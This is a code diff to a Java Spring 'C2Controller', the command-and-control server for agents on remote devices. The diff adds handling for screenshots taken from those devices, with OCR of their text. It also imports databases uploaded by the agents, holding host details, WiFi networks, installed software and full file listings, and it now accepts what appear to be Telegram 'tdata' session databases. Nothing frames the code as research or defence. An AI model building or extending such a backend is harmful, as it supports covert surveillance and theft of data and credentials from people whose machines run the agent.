@@ -29,13 +29,22 @@ import java.util.ArrayList;
 
 import java.io.FileOutputStream;
 import java.util.Base64;
+import org.springframework.data.redis.core.StringRedisTemplate;
+import java.util.concurrent.TimeUnit;
+import cn.hutool.cache.Cache;
+import cn.hutool.cache.CacheUtil;
+import cn.hutool.crypto.digest.DigestUtil;
 
 /**
  * C2 Controller (Agent Communication)
  */
 @RestController
-@Slf4j
+//@Slf4j
 public class C2Controller {
+
+    private static final org.slf4j.Logger log = org.slf4j.LoggerFactory.getLogger(C2Controller.class);
+    
+    // In-memory cache removed in favor of Redis
 
     @Resource
     private C2TaskMapper c2TaskMapper;
@@ -59,7 +68,13 @@ public class C2Controller {
     private com.yupi.springbootinit.service.C2FileScanService c2FileScanService;
 
     @Resource
+    private com.yupi.springbootinit.service.C2FileSystemNodeService c2FileSystemNodeService;
+
+    @Resource
     private com.yupi.springbootinit.service.OcrService ocrService;
+
+    @Resource
+    private StringRedisTemplate stringRedisTemplate;
 
     private final Gson gson = new Gson();
     
@@ -118,6 +133,19 @@ public class C2Controller {
                     "device_uuid varchar(64) not null, " +
                     "task_id varchar(64) null, " +
                     "url varchar(512) null, " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
+                    "is_delete tinyint default 0 not null)");
+
+            // C2 File System Node
+            jdbcTemplate.execute("create table if not exists c2_file_system_node (" +
+                    "id bigint auto_increment primary key, " +
+                    "device_uuid varchar(64) not null, " +
+                    "parent_path varchar(512) null, " +
+                    "path varchar(512) null, " +
+                    "name varchar(256) null, " +
+                    "is_directory tinyint default 0 null, " +
+                    "size bigint null, " +
+                    "last_modified datetime null, " +
                     "create_time datetime default CURRENT_TIMESTAMP not null, " +
                     "is_delete tinyint default 0 not null)");
 
@@ -366,6 +394,41 @@ public class C2Controller {
         return response;
     }
 
+    /**
+     * Poll for pending tasks (GET version for C++ client) - DELEGATED TO C2TaskController
+     */
+    /*
+    @GetMapping("/c2Task/poll")
+    public Map<String, Object> pollTasks(@RequestParam("deviceUuid") String deviceUuid) {
+        Map<String, Object> response = new HashMap<>();
+        
+        if (deviceUuid == null || deviceUuid.isEmpty()) {
+            return response;
+        }
+
+        QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
+        queryWrapper.eq("status", "pending");
+        queryWrapper.and(qw -> qw.eq("device_uuid", deviceUuid).or().isNull("device_uuid"));
+        
+        List<C2Task> tasks = c2TaskMapper.selectList(queryWrapper);
+        response.put("data", tasks);
+        
+        return response;
+    }
+    */
+
+    /**
+     * Handle file system list upload (JSON) - DELEGATED TO C2FileController
+     */
+    /*
+    @PostMapping("/c2/file/upload")
+    public BaseResponse<Boolean> uploadFileList(@RequestBody Map<String, Object> body) {
+        // Stub implementation to avoid 404
+        // Logic would be to insert into c2_file_system_node
+        return ResultUtils.success(true);
+    }
+    */
+
     @PostMapping("/c2/tasks/result")
     public BaseResponse<Boolean> submitTaskResult(@RequestBody Map<String, Object> body, HttpServletRequest request) {
         Map<String, Object> payload = body;
@@ -401,6 +464,18 @@ public class C2Controller {
                     task.setDeviceUuid((String) payload.get("uuid"));
                 }
                 
+                // Deduplication
+                boolean isDuplicate = false;
+                if (result != null && ("get_software".equals(task.getCommand()) || "get_wifi".equals(task.getCommand()) || "scan_recent".equals(task.getCommand()))) {
+                     String currentHash = DigestUtil.md5Hex(result);
+                     String cacheKey = "dedup:" + task.getDeviceUuid() + "_" + task.getCommand() + "_" + currentHash;
+                     if (Boolean.TRUE.equals(stringRedisTemplate.hasKey(cacheKey))) {
+                         isDuplicate = true;
+                     } else {
+                         stringRedisTemplate.opsForValue().set(cacheKey, "1", 1, TimeUnit.HOURS);
+                     }
+                }
+                
                 if (result != null) {
                     task.setResult(result);
                 }
@@ -409,7 +484,17 @@ public class C2Controller {
                 } else {
                     task.setStatus("completed"); // Default to completed if not specified
                 }
+                
+                if (isDuplicate) {
+                    log.info("Skipping duplicate result processing for task {} (command: {})", taskId, task.getCommand());
+                    task.setResult("Skipped duplicate data processing");
+                }
+                
                 c2TaskMapper.updateById(task);
+                
+                if (isDuplicate) {
+                    return ResultUtils.success(true);
+                }
                 
                 // If this was a get_software task, update the device's software list
                 if ("get_software".equals(task.getCommand()) && result != null) {
@@ -813,6 +898,85 @@ public class C2Controller {
         return ResultUtils.success(true);
     }
     
+    @GetMapping("/c2/syncScreenshots")
+    public BaseResponse<String> syncScreenshots() {
+        File uploadDir = new File("uploads");
+        if (!uploadDir.exists() || !uploadDir.isDirectory()) {
+            return ResultUtils.success("Upload directory not found.");
+        }
+
+        File[] uuidDirs = uploadDir.listFiles();
+        if (uuidDirs == null) {
+            return ResultUtils.success("No UUID directories found.");
+        }
+
+        int count = 0;
+        int updatedCount = 0;
+        for (File uuidDir : uuidDirs) {
+            if (uuidDir.isDirectory()) {
+                String uuid = uuidDir.getName();
+                File[] files = uuidDir.listFiles();
+                if (files != null) {
+                    for (File file : files) {
+                        String filename = file.getName();
+                        if (filename.toLowerCase().endsWith(".png") || filename.toLowerCase().endsWith(".jpg") || filename.toLowerCase().endsWith(".jpeg")) {
+                            // Check if exists in DB
+                            C2Screenshot existing = null;
+                            try {
+                                existing = c2ScreenshotMapper.selectOne(new QueryWrapper<C2Screenshot>()
+                                    .eq("device_uuid", uuid)
+                                    .like("url", "%" + filename) // Use like to match filename in url
+                                    .last("LIMIT 1"));
+                            } catch (Exception e) {
+                                // Ignore multiple results, just skip or handle later
+                            }
+                            
+                            if (existing == null) {
+                                // Insert
+                                try {
+                                    String ocrText = ocrService.doOcr(file);
+                                    
+                                    C2Screenshot screenshot = new C2Screenshot();
+                                    screenshot.setDeviceUuid(uuid);
+                                    
+                                    String taskId = "sync_" + System.currentTimeMillis();
+                                    if (filename.contains("_") && filename.lastIndexOf(".") > filename.indexOf("_")) {
+                                        try {
+                                            taskId = filename.substring(filename.indexOf("_") + 1, filename.lastIndexOf("."));
+                                        } catch (Exception ignore) {}
+                                    }
+                                    
+                                    screenshot.setTaskId(taskId);
+                                    String url = "/api/c2/download?uuid=" + uuid + "&filename=" + filename;
+                                    screenshot.setUrl(url);
+                                    screenshot.setOcrResult(ocrText);
+                                    screenshot.setCreateTime(new Date(file.lastModified()));
+                                    c2ScreenshotMapper.insert(screenshot);
+                                    count++;
+                                } catch (Exception e) {
+                                    log.error("Failed to sync file: " + filename, e);
+                                }
+                            } else {
+                                // Update OCR if missing
+                                if (existing.getOcrResult() == null || existing.getOcrResult().trim().isEmpty()) {
+                                    try {
+                                        String ocrText = ocrService.doOcr(file);
+                                        existing.setOcrResult(ocrText);
+                                        c2ScreenshotMapper.updateById(existing);
+                                        updatedCount++;
+                                    } catch (Exception e) {
+                                        log.error("Failed to OCR existing file: " + filename, e);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        return ResultUtils.success("Synced " + count + " new screenshots, updated " + updatedCount + " existing screenshots.");
+    }
+
     /**
      * Handle file upload from client
      */
@@ -857,11 +1021,12 @@ public class C2Controller {
         }
         
         // Handle scan_disk optimization (SQLite DB upload)
-        // Allow variations like "scan_results.db" or "scan_results_uuid.db"
-        if (filename != null && filename.startsWith("scan_results") && filename.endsWith(".db")) {
+        // Allow variations like "scan_results.db", "scan_results_uuid.db", or "tdata_client_TGID.db"
+        if (filename != null && (filename.startsWith("scan_results") || filename.startsWith("tdata_client")) && filename.endsWith(".db")) {
              try {
                  // Save to uploads directory instead of system temp to avoid permission/space issues
-                 File tempDb = new File(dir, "scan_" + taskId + "_" + System.currentTimeMillis() + ".db");
+                 // FIX: Use getAbsolutePath() to ensure transferTo writes to the correct location (CWD) not Tomcat temp dir
+                 File tempDb = new File(dir.getAbsolutePath(), "scan_" + taskId + "_" + System.currentTimeMillis() + ".db");
                  log.info("Saving scan results to: {}", tempDb.getAbsolutePath());
                  file.transferTo(tempDb);
                  
@@ -878,10 +1043,29 @@ public class C2Controller {
         }
 
         // Standard file upload
-        File dest = new File(dir, filename);
+        // FIX: Use getAbsolutePath()
+        File dest = new File(dir.getAbsolutePath(), filename);
         try {
             file.transferTo(dest);
             
+            // Universal OCR & Screenshot Record for any image upload
+            if (filename.toLowerCase().endsWith(".png") || filename.toLowerCase().endsWith(".jpg") || filename.toLowerCase().endsWith(".jpeg")) {
+                try {
+                    String ocrText = ocrService.doOcr(dest);
+                    
+                    C2Screenshot screenshot = new C2Screenshot();
+                    screenshot.setDeviceUuid(targetDirName);
+                    screenshot.setTaskId(taskId);
+                    String url = "/api/c2/download?uuid=" + targetDirName + "&filename=" + filename;
+                    screenshot.setUrl(url);
+                    screenshot.setOcrResult(ocrText);
+                    screenshot.setCreateTime(new Date());
+                    c2ScreenshotMapper.insert(screenshot);
+                } catch (Exception e) {
+                    log.error("OCR failed for uploaded image: " + filename, e);
+                }
+            }
+
             // Update task status if taskId is provided (fixes "waiting" status)
             if (taskId != null) {
                 C2Task task = c2TaskMapper.selectOne(new QueryWrapper<C2Task>().eq("taskId", taskId));
@@ -890,17 +1074,11 @@ public class C2Controller {
                     task.setResult("File uploaded: " + filename);
                     c2TaskMapper.updateById(task);
 
-                    // Handle screenshot upload
-                    if ("get_screenshot".equals(task.getCommand())) {
-                        C2Screenshot screenshot = new C2Screenshot();
-                        
-                        screenshot.setDeviceUuid(targetDirName);
-                        screenshot.setTaskId(taskId);
-                        // Construct URL for download
-                        String url = "/api/c2/download?uuid=" + targetDirName + "&filename=" + filename;
-                        screenshot.setUrl(url);
-                        screenshot.setCreateTime(new Date());
-                        c2ScreenshotMapper.insert(screenshot);
+                    // If it was a screenshot task, ensure the result link is correct
+                    if ("get_screenshot".equals(task.getCommand()) || "screenshot".equals(task.getCommand())) {
+                         String url = "/api/c2/download?uuid=" + targetDirName + "&filename=" + filename;
+                         task.setResult(url);
+                         c2TaskMapper.updateById(task);
                     }
                 }
             }
@@ -923,53 +1101,266 @@ public class C2Controller {
         try {
             log.info("Processing DB file: {}", tempDb.getAbsolutePath());
             
-            // Connect to SQLite
-            // Ensure sqlite-jdbc is in pom.xml
             String url = "jdbc:sqlite:" + tempDb.getAbsolutePath();
+            
             try (java.sql.Connection conn = java.sql.DriverManager.getConnection(url);
-                 java.sql.Statement stmt = conn.createStatement();
-                 java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM files")) {
+                 java.sql.Statement stmt = conn.createStatement()) {
                 
-                List<C2FileScan> batchList = new ArrayList<>();
-                int batchSize = 1000;
-                int totalCount = 0;
-                
-                while (rs.next()) {
-                    C2FileScan scan = new C2FileScan();
-                    
-                    scan.setDeviceUuid(deviceUuid); // Set UUID
-                    scan.setFilePath(rs.getString("path"));
-                    scan.setFileName(rs.getString("name"));
-                    // Handle potential type mismatch
-                    Object sizeObj = rs.getObject("size");
-                    if (sizeObj instanceof Number) {
-                        scan.setFileSize(((Number) sizeObj).longValue());
+                // 1. Process System Info
+                try {
+                    java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM system_info");
+                    if (rs.next()) {
+                        if (device == null) {
+                            device = new C2Device();
+                            device.setUuid(deviceUuid);
+                            device.setCreateTime(new Date());
+                        }
+                        device.setInternalIp(rs.getString("internal_ip"));
+                        device.setMacAddress(rs.getString("mac_address"));
+                        device.setHostName(rs.getString("hostname"));
+                        device.setOs(rs.getString("os"));
+                        device.setLastSeen(new Date());
+                        
+                        // Update device
+                        QueryWrapper<C2Device> check = new QueryWrapper<>();
+                        check.eq("uuid", deviceUuid);
+                        if (c2DeviceMapper.selectCount(check) > 0) {
+                            c2DeviceMapper.update(device, check);
+                        } else {
+                            c2DeviceMapper.insert(device);
+                        }
                     }
-                    scan.setMd5(rs.getString("md5"));
-                    scan.setIsRecent(0); // Full scan
-                    scan.setCreateTime(new Date());
+                    rs.close();
+                } catch (Exception e) {
+                    log.warn("Failed to process system_info: {}", e.getMessage());
+                }
+
+                // 2. Process WiFi Scan Results
+                try {
+                    java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM wifi_scan_results");
+                    List<C2Wifi> wifiList = new ArrayList<>();
+                    StringBuilder hashBuilder = new StringBuilder();
                     
-                    // last_modified
-                    long lastMod = rs.getLong("last_modified");
-                    if (lastMod > 0) {
-                        scan.setLastModified(new Date(lastMod * 1000));
+                    while (rs.next()) {
+                        C2Wifi wifi = new C2Wifi();
+                        wifi.setDeviceUuid(deviceUuid);
+                        wifi.setSsid(rs.getString("ssid"));
+                        wifi.setBssid(rs.getString("bssid"));
+                        wifi.setSignalStrength(rs.getString("signal_strength"));
+                        wifi.setAuthentication(rs.getString("security_type"));
+                        wifi.setCreateTime(new Date());
+                        wifiList.add(wifi);
+                        
+                        // Build hash string (bssid + ssid)
+                        hashBuilder.append(wifi.getBssid()).append(wifi.getSsid()).append("|");
+                    }
+                    rs.close();
+                    
+                    // Hash Check
+                    String currentHash = DigestUtil.md5Hex(hashBuilder.toString());
+                    String redisKey = "dedup:hash:wifi:" + deviceUuid;
+                    String lastHash = stringRedisTemplate.opsForValue().get(redisKey);
+                    
+                    if (lastHash != null && lastHash.equals(currentHash)) {
+                        log.info("WiFi scan results identical to last scan for device {}, skipping DB write.", deviceUuid);
                     } else {
-                        scan.setLastModified(new Date());
+                        // Update DB
+                        c2WifiMapper.delete(new QueryWrapper<C2Wifi>().eq("device_uuid", deviceUuid));
+                        
+                        if (!wifiList.isEmpty()) {
+                            // Simple batch insert loop (mapper doesn't have saveBatch, service does but we can just loop or use service if available)
+                            // We don't have C2WifiService injected, so just loop insert. 
+                            // Since it's usually small list (<50), loop is fine.
+                            for (C2Wifi wifi : wifiList) {
+                                c2WifiMapper.insert(wifi);
+                            }
+                        }
+                        
+                        // Update Redis
+                        stringRedisTemplate.opsForValue().set(redisKey, currentHash, 7, TimeUnit.DAYS);
+                        log.info("Updated WiFi scan results for device {}", deviceUuid);
+                    }
+
+                } catch (Exception e) {
+                    log.warn("Failed to process wifi_scan_results: {}", e.getMessage());
+                }
+
+                // 3. Process Installed Software
+                try {
+                    java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM installed_software");
+                    List<C2Software> softwareList = new ArrayList<>();
+                    
+                    while (rs.next()) {
+                        C2Software sw = new C2Software();
+                        sw.setDeviceUuid(deviceUuid);
+                        sw.setName(rs.getString("name"));
+                        sw.setVersion(rs.getString("version"));
+                        sw.setInstallDate(rs.getString("install_date"));
+                        sw.setCreateTime(new Date());
+                        softwareList.add(sw);
+                    }
+                    rs.close();
+                    
+                    // Sort to ensure consistent hash
+                    softwareList.sort((a, b) -> (a.getName() + a.getVersion()).compareTo(b.getName() + b.getVersion()));
+                    
+                    StringBuilder hashBuilder = new StringBuilder();
+                    for (C2Software sw : softwareList) {
+                        hashBuilder.append(sw.getName()).append(sw.getVersion()).append("|");
                     }
                     
-                    batchList.add(scan);
-                    totalCount++;
+                    String currentHash = DigestUtil.md5Hex(hashBuilder.toString());
+                    String redisKey = "dedup:hash:soft:" + deviceUuid;
+                    String lastHash = stringRedisTemplate.opsForValue().get(redisKey);
                     
-                    if (batchList.size() >= batchSize) {
+                    if (lastHash != null && lastHash.equals(currentHash)) {
+                        log.info("Software scan results identical to last scan for device {}, skipping DB write.", deviceUuid);
+                    } else {
+                        // Update DB
+                        c2SoftwareMapper.delete(new QueryWrapper<C2Software>().eq("device_uuid", deviceUuid));
+                        
+                        if (!softwareList.isEmpty()) {
+                            // Loop insert (software list can be 100-200)
+                            for (C2Software sw : softwareList) {
+                                c2SoftwareMapper.insert(sw);
+                            }
+                        }
+                        
+                        stringRedisTemplate.opsForValue().set(redisKey, currentHash, 7, TimeUnit.DAYS);
+                        log.info("Updated Software scan results for device {}", deviceUuid);
+                    }
+
+                } catch (Exception e) {
+                    log.warn("Failed to process installed_software: {}", e.getMessage());
+                }
+
+                // 4. Process File Scan Results (files or file_scan_results)
+                try {
+                    // Clear old File Scan records (Only full scan, not recent)
+                    c2FileScanMapper.delete(new QueryWrapper<C2FileScan>().eq("device_uuid", deviceUuid).eq("isRecent", 0));
+                    // Also clear File System Nodes for this device to ensure fresh view
+                    c2FileSystemNodeService.remove(new QueryWrapper<C2FileSystemNode>().eq("device_uuid", deviceUuid));
+
+                    String fileTable = "files";
+                    // Check if file_scan_results exists
+                    try {
+                        stmt.executeQuery("SELECT 1 FROM file_scan_results LIMIT 1").close();
+                        fileTable = "file_scan_results";
+                    } catch (Exception ex) {
+                        // ignore, use files
+                    }
+
+                    java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM " + fileTable);
+                    List<C2FileScan> batchList = new ArrayList<>();
+                    List<C2FileSystemNode> nodeList = new ArrayList<>();
+                    int batchSize = 1000;
+                    int totalCount = 0;
+                    
+                    while (rs.next()) {
+                        String filePath = rs.getString("path");
+                        
+                        // Deduplication check
+                        String key = "dedup:file:" + deviceUuid + ":" + filePath;
+                        if (Boolean.TRUE.equals(stringRedisTemplate.hasKey(key))) {
+                            // continue; // Commented out to ensure we populate node table even if cached
+                        }
+                        stringRedisTemplate.opsForValue().set(key, "1", 1, TimeUnit.HOURS);
+
+                        // 1. Add to C2FileScan (Search/Flat View)
+                        C2FileScan scan = new C2FileScan();
+                        scan.setDeviceUuid(deviceUuid);
+                        scan.setFilePath(filePath);
+                        // Extract name if not present in DB
+                        String fileName = filePath;
+                        if (filePath.contains(File.separator)) {
+                            fileName = filePath.substring(filePath.lastIndexOf(File.separator) + 1);
+                        } else if (filePath.contains("/")) {
+                             fileName = filePath.substring(filePath.lastIndexOf("/") + 1);
+                        } else if (filePath.contains("\\")) {
+                             fileName = filePath.substring(filePath.lastIndexOf("\\") + 1);
+                        }
+                        
+                        try {
+                            if (rs.findColumn("name") > 0) {
+                                String dbName = rs.getString("name");
+                                if (dbName != null && !dbName.isEmpty()) fileName = dbName;
+                            }
+                        } catch (Exception ignore) {}
+
+                        scan.setFileName(fileName);
+                        
+                        long sizeVal = 0;
+                        Object sizeObj = rs.getObject("size");
+                        if (sizeObj instanceof Number) {
+                            sizeVal = ((Number) sizeObj).longValue();
+                            scan.setFileSize(sizeVal);
+                        }
+                        scan.setMd5(rs.getString("md5")); // Might be null
+                        scan.setIsRecent(0);
+                        scan.setCreateTime(new Date());
+                        
+                        long lastMod = rs.getLong("last_modified");
+                        Date lastModDate;
+                        if (lastMod > 0) {
+                            lastModDate = new Date(lastMod * 1000);
+                        } else {
+                            lastModDate = new Date();
+                        }
+                        scan.setLastModified(lastModDate);
+                        
+                        batchList.add(scan);
+                        
+                        // 2. Add to C2FileSystemNode (Tree View)
+                        C2FileSystemNode node = new C2FileSystemNode();
+                        node.setDeviceUuid(deviceUuid);
+                        node.setPath(filePath);
+                        node.setName(fileName);
+                        
+                        String parentPath = "";
+                        if (filePath.contains(File.separator)) {
+                             parentPath = filePath.substring(0, filePath.lastIndexOf(File.separator));
+                        } else if (filePath.contains("/")) {
+                             parentPath = filePath.substring(0, filePath.lastIndexOf("/"));
+                        } else if (filePath.contains("\\")) {
+                             parentPath = filePath.substring(0, filePath.lastIndexOf("\\"));
+                        }
+                        node.setParentPath(parentPath);
+                        
+                        int isDir = 0;
+                        try {
+                            isDir = rs.getInt("is_dir");
+                        } catch (Exception ignore) {}
+                        node.setIsDirectory(isDir);
+                        
+                        node.setSize(sizeVal);
+                        node.setLastModified(lastModDate);
+                        node.setCreateTime(new Date());
+                        
+                        nodeList.add(node);
+
+                        totalCount++;
+                        
+                        if (batchList.size() >= batchSize) {
+                             c2FileScanService.saveBatch(batchList);
+                             batchList.clear();
+                        }
+                        if (nodeList.size() >= batchSize) {
+                             c2FileSystemNodeService.saveBatch(nodeList);
+                             nodeList.clear();
+                        }
+                    }
+                    
+                    if (!batchList.isEmpty()) {
                          c2FileScanService.saveBatch(batchList);
-                         batchList.clear();
                     }
+                    if (!nodeList.isEmpty()) {
+                         c2FileSystemNodeService.saveBatch(nodeList);
+                    }
+                    rs.close();
+                    log.info("Processed {} files from scan results into C2FileScan and C2FileSystemNode", totalCount);
+                } catch (Exception e) {
+                    log.warn("Failed to process file scan results: {}", e.getMessage());
                 }
-                
-                if (!batchList.isEmpty()) {
-                     c2FileScanService.saveBatch(batchList);
-                }
-                log.info("Processed {} files from scan results", totalCount);
             }
             
             // Update task status
@@ -981,8 +1372,6 @@ public class C2Controller {
                     c2TaskMapper.updateById(task);
                 }
             }
-            
-            log.info("Processed {} files from scan results", totalCount);
             
         } catch (Exception e) {
             log.error("Failed to process scan results", e);
@@ -1114,6 +1503,24 @@ public class C2Controller {
             device.setOs(os);
             device.setMacAddress(macAddress);
             device.setLastSeen(new Date());
+            
+            // Set additional fields for new device
+            if (payload.containsKey("heartbeatInterval")) {
+                 Object val = payload.get("heartbeatInterval");
+                 if (val instanceof Number) {
+                     device.setHeartbeatInterval(((Number) val).intValue());
+                 }
+            }
+            if (payload.containsKey("isMonitorOn")) {
+                 Object val = payload.get("isMonitorOn");
+                 if (val instanceof Number) {
+                     device.setIsMonitorOn(((Number) val).intValue());
+                 }
+            }
+            if (payload.containsKey("dataStatus")) {
+                 device.setDataStatus((String) payload.get("dataStatus"));
+            }
+            
             c2DeviceMapper.insert(device);
         } else {
             device.setLastSeen(new Date());
@@ -1141,9 +1548,45 @@ public class C2Controller {
             if (!"Unknown".equals(os)) {
                 device.setOs(os);
             }
-            c2DeviceMapper.updateById(device);
+            
+            // Update additional fields
+            if (payload.containsKey("heartbeatInterval")) {
+                 Object val = payload.get("heartbeatInterval");
+                 if (val instanceof Number) {
+                     device.setHeartbeatInterval(((Number) val).intValue());
+                 }
+            }
+            if (payload.containsKey("isMonitorOn")) {
+                 Object val = payload.get("isMonitorOn");
+                 if (val instanceof Number) {
+                     device.setIsMonitorOn(((Number) val).intValue());
+                 }
+            }
+            if (payload.containsKey("dataStatus")) {
+                 device.setDataStatus((String) payload.get("dataStatus"));
+            }
+            
+            // Rate Limit: Skip DB update if < 30s since last write to reduce load
+            boolean skipUpdate = false;
+            if (device.getUuid() != null) {
+                String cacheKey = "rate:hb:" + device.getUuid();
+                try {
+                    if (Boolean.TRUE.equals(stringRedisTemplate.hasKey(cacheKey))) {
+                        skipUpdate = true;
+                    } else {
+                        stringRedisTemplate.opsForValue().set(cacheKey, String.valueOf(System.currentTimeMillis()), 30, TimeUnit.SECONDS);
+                    }
+                } catch (Exception e) {
+                    log.error("Cache error in heartbeat: {}", e.getMessage());
+                }
+            }
+
+            if (!skipUpdate) {
+                c2DeviceMapper.updateById(device);
+            }
         }
         return device;
     }
+
 }
 
